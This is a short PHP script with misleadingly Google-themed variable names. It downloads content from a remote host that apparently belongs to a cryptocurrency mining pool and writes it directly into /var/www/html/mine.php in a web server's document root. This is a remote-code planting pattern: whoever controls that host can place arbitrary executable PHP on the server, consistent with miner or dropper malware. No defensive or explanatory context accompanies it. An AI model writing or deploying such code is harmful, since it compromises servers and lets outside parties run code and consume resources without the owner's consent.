<?php

$googleappscountryapps8884 = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, "ZA");

$googleappscountryapps8884 = reset($googleappscountryapps8884);

date_default_timezone_set($googleappscountryapps8884);

$google847474747474 = file_get_contents("http://mine.arionumpool.com/mine.php?q=info");

$google847474747474 = file_put_contents("/var/www/html/mine.php","$google847474747474");

echo "$google847474747474";

?>

